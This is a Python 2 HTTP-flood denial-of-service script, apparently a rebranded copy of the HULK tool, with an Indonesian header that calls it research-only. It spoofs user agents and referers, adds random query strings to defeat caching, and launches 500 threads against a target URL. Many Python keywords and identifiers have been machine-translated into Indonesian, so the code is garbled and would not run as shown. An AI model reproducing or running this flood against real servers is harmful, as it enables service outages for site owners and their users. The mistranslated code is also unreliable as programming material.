# ------------------------------------------------- ---------------------------------------------

# WorkDdos - HTTP Unbearable Load King

#

# Alat ini adalah alat dos yang dimaksudkan untuk memberikan beban berat pada server HTTP untuk membawanya

# berlutut dengan menghabiskan sumber daya, ini dimaksudkan untuk tujuan penelitian saja

# dan penggunaan jahat apa pun dari alat ini dilarang.

#

# author: KangProf-Acc, versi 1.0

# ------------------------------------------------- ---------------------------------------------

import  urllib2

impor  sys

import  threading

impor  acak

impor  kembali


#global params

url = ''

host = ''

headers_useragents = []

headers_referers = []

request_counter = 0

bendera = 0

aman = 0


def  inc_counter ():

	 request_counter global

	request_counter + = 1


def  set_flag ( val ):

	 bendera global

	bendera = val


def  set_safe ():

	 keamanan global

	aman = 1


# menghasilkan array agen pengguna

def  useragent_list ():

	global  headers_useragents

	headers_useragents . tambahkan ( 'Mozilla / 5.0 (X11; U; Linux x86_64; en-US; rv: 1.9.1.3) Gecko / 20090913 Firefox / 3.5.3' )

	headers_useragents . tambahkan ( 'Mozilla / 5.0 (Windows; U; Windows NT 6.1; en; rv: 1.9.1.3) Gecko / 20090824 Firefox / 3.5.3 (.NET CLR 3.5.30729)' )

	headers_useragents . tambahkan ( 'Mozilla / 5.0 (Windows; U; Windows NT 5.2; en-US; rv: 1.9.1.3) Gecko / 20090824 Firefox / 3.5.3 (.NET CLR 3.5.30729)' )

	headers_useragents . tambahkan ( 'Mozilla / 5.0 (Windows; U; Windows NT 6.1; en-US; rv: 1.9.1.1) Gecko / 20090718 Firefox / 3.5.1' )

	headers_useragents . tambahkan ( 'Mozilla / 5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit / 532.1 (KHTML, like Gecko) Chrome / 4.0.219.6 Safari / 532.1' )

	headers_useragents . tambahkan ( 'Mozilla / 4.0 (kompatibel; MSIE 8.0; Windows NT 6.1; WOW64; Trident / 4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)' )

	headers_useragents . tambahkan ( 'Mozilla / 4.0 (kompatibel; MSIE 8.0; Windows NT 6.0; Trident / 4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729) ' )

	headers_useragents . tambahkan ( 'Mozilla / 4.0 (kompatibel; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident / 4.0)' )

	headers_useragents . tambahkan ( 'Mozilla / 4.0 (kompatibel; MSIE 8.0; Windows NT 5.1; Trident / 4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)' )

	headers_useragents . tambahkan ( 'Mozilla / 5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)' )

	headers_useragents . tambahkan ( 'Mozilla / 4.0 (kompatibel; MSIE 6.1; Windows XP)' )

	headers_useragents . tambahkan ( 'Opera / 9.80 (Windows NT 5.2; U; ru) Presto / 2.5.22 Versi / 10.51' )

	kembali ( headers_useragents )


# menghasilkan array pengarah

def  referer_list ():

	global headers_referers

	headers_referers.append('http://www.google.com/?q=')

	headers_referers.append('http://www.usatoday.com/search/results?q=')

	headers_referers.append('http://engadget.search.aol.com/search?q=')

	headers_referers.append('http://' + host + '/')

	return(headers_referers)


#builds random ascii string

def buildblock(size):

	out_str = ''

	for i in range(0, size):

		a = random.randint(65, 90)

		out_str += chr(a)

	return(out_str)


def usage():

	print '---------------------------------------------------'

	print 'USAGE: python hulk.py <url>'

	print 'you can add "safe" after url, to autoshut after dos'

	print '---------------------------------------------------'



#http request

def httpcall(url):

	useragent_list()

	referer_list()

	code=0

	if url.count("?")>0:

		param_joiner="&"

	else:

		param_joiner="?"

	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))

	request.add_header('User-Agent', random.choice(headers_useragents))

	request.add_header('Cache-Control', 'no-cache')

	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')

	permintaan . add_header ( 'Referer' , random . choice ( headers_referers ) +  buildblock ( random . randint ( 5 , 10 )))

	permintaan . add_header ( 'Keep-Alive' , random . randint ( 110 , 120 ))

	permintaan . add_header ( 'Sambungan' , 'tetap hidup' )

	permintaan . add_header ( 'Host' , host )

	coba :

			urllib2 . urlopen ( permintaan )

	kecuali  urllib2 . HTTPError , e :

			#print e.code

			set_flag ( 1 )

			cetak  'Kode Respon 500'

			kode = 500

	kecuali  urllib2 . URLError , e :

			#print e.reason

			sys . keluar ()

	lain :

			inc_counter ()

			urllib2 . urlopen ( permintaan )

	kembali ( kode )		



#http utas pemanggil 

kelas  HTTPThread ( threading . Thread ):

	def  run ( self ):

		coba :

			sedangkan  bendera < 2 :

				kode = httpcall ( url )

				jika ( kode == 500 ) & ( aman == 1 ):

					set_flag ( 2 )

		kecuali  Pengecualian , mis . :

			lulus


# memantau utas http dan menghitung permintaan

kelas  MonitorThread ( threading . Thread ):

	def  run ( self ):

		sebelumnya = request_counter

		sedangkan  bendera == 0 :

			jika ( sebelumnya + 100 < request_counter ) & ( sebelumnya <> request_counter ):

				cetak  "% d Permintaan Terkirim"  % ( request_counter )

				sebelumnya = request_counter

		jika  bendera == 2 :

			cetak  " \ n - Serangan HULK Selesai -"


#menjalankan 

jika  len ( sys . argv ) <  2 :

	penggunaan ()

	sys . keluar ()

lain :

	jika  sys . argv [ 1 ] == "bantuan" :

		penggunaan ()

		sys . keluar ()

	lain :

		print  "- Serangan HULK Dimulai -"

		jika  len ( sys . argv ) ==  3 :

			jika  sys . argv [ 2 ] == "aman" :

				set_safe ()

		url  =  sys . argv [ 1 ]

		jika  url . hitungan ( "/" ) == 2 :

			url  =  url  +  "/"

		m  =  re . pencarian ( '(https? \: //)? ([^ /] *) /?.*' , url )

		tuan rumah  =  m . kelompok ( 2 )

		untuk  saya  dalam  jangkauan ( 500 ):

			t  =  HTTPThread ()

			t . mulai ()

		t  =  MonitorThread ()

		t . mulai ()
